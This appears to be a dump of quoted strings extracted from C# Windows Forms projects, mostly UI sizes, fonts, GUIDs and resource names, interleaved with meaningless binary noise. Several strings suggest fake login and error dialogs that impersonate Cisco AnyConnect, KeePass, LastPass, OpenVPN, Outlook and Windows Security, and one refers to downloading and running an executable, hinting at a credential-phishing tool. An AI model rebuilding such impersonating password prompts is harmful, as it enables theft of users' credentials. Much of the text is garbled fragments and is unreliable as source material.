"("" + commandLineArg + """
"("""
"("""""
"(""(None"
"(""+_[""v%N"
"(""1.0.*"""
"(""1.0.0.0"""
"(""10cc4d5b-dc87-4aeb-887b-e47367bf656b"""
"(""4ed3c17d-33e6-4b86-9fa0-da774b7cd387"""
"(""78de9716-84e8-4469-a5ae-f3e43181c28b"""
"(""@"""
"(""@]~"
"(""AnyConnect was not able to establish a connection to the\nspecified secure gaetway. Please try connection again."", ""Cisco AnyConnect"", MessageBoxIcon.Error"
"(""Check your master password and try again."""
"(""CiscoAnyConnect"""
"(""CiscoAnyConnect.Properties.Resources"", typeof(Resources"
"(""Courier New"", 8, FontStyle.Regular"
"(""Enter a valid email address."""
"(""Invalid email or password!"""
"(""KeePass"""
"(""KeePass.Properties.Resources"", typeof(Resources"
"(""LastPass"""
"(""LastPass.Properties.Resources"", typeof(Resources"
"(""Microsoft Sans Serif"", 11F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte"
"(""Microsoft Sans Serif"", 8F"
"(""Microsoft Sans Serif"", 8f"
"(""Microsoft Sans Serif"", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte"
"(""Microsoft Tai Le"", 11, FontStyle.Regular"
"(""Microsoft Tai Le"", 11.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte"
"(""Microsoft Tai Le"", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte"
"(""Microsoft Tai Le"", 14.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte"
"(""Microsoft.Performance"", ""CA1811:AvoidUncalledPrivateCode"""
"(""Microsoft.VisualStudio.Editors.SettingsDesigner.SettingsSingleFileGenerator"", ""11.0.0.0"""
"(""OpenVPN"""
"(""OpenVPN.Properties.Resources"", typeof(Resources"
"(""Outlook"""
"(""Qn'w""g@d"
"(""Segoe UI"", 8, FontStyle.Regular"
"(""System.Resources.Tools.StronglyTypedResourceBuilder"", ""17.0.0.0"""
"(""System.Resources.Tools.StronglyTypedResourceBuilder"", ""4.0.0.0"""
"(""Usage: wpfRunner.exe <arg>"""
"(""V"
"(""WindowsSecurity.Properties.Resources"", typeof(Resources"
"(""You may have mistyped your email address.\nTry again."""
"(""\nUnknown Error."", ""Cisco AnyConnect"", MessageBoxIcon.Error"
"(""\nUnknown Error."", ""KeePass"", MessageBoxIcon.Error"
"(""_64_logo"", resourceCulture"
"(""bg"", resourceCulture"
"(""bluex"", resourceCulture"
"(""connecting"", resourceCulture"
"(""cross"", resourceCulture"
"(""d6948efc-aa15-413d-8ef1-032c149d3fbb"""
"(""ddd MMM dd HH:mm:ss yyyy"""
"(""en-US"", UltimateResourceFallbackLocation.Satellite"
"(""eye"", resourceCulture"
"(""eye_stroke"", resourceCulture"
"(""openvpn_gui"", resourceCulture"
"(""test"", resourceCulture"
"(""test_blue"", resourceCulture"
"(""zcE"
"(""{DateTimePlaceholder}"", formattedDateTime"
"(""{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}"""
"(""|"
"($""Failed to download and run the executable: {ex.Message}"""
"($""{DateTime.Now.ToString("
"($Z ""qG.|_"
"(%""0P"
"(&("""
"(&GG:,S"
"(*M,k"
"(+2'%0""*"
"(,"
"(,1Sh"
"(,8"
"(,PPkH"
"(,Qx0d"
"(,_aexc1#"
"(,f"
"(,gs|"
"(,h\"
"(-koDI%+'-&,_dMR%+'-&,TYX]&,#"
"(.$*tx?D%+'-'-'-'-&,"
"(0, 13"
"(0, 130"
"(0, 44"
"(0, 80"
"(0, charactersToDisplay"
"(10, 15"
"(10, 41"
"(100, 17"
"(106, 17"
"(109, 17"
"(110, 154"
"(112, 26"
"(118, 48"
"(118, 78"
"(12, 102"
"(12, 12"
"(12, 120"
"(12, 128"
"(12, 171"
"(12, 67"
"(12, 76"
"(127, 100"
"(127, 74"
"(128, 33"
"(13, 286"
"(13, 315"
"(13, 355"
"(130, 19"
"(134, 13"
"(135, 17"
"(136, 25"
"(1384, 906"
"(141, 20"
"(145, 303"
"(148, 90"
"(150, 25"
"(151, 19"
"(159, 138"
"(16, 16"
"(160, 132"
"(171, 425"
"(18, 27"
"(18, 303"
"(18, 8"
"(181, 97"
"(187, 21"
"(2, 0, 0, 0"
"(20, 15"
"(20, 20"
"(200, 21"
"(202, 37"
"(204, 0, 0"
"(207, 20"
"(208, 20"
"(209, 19"
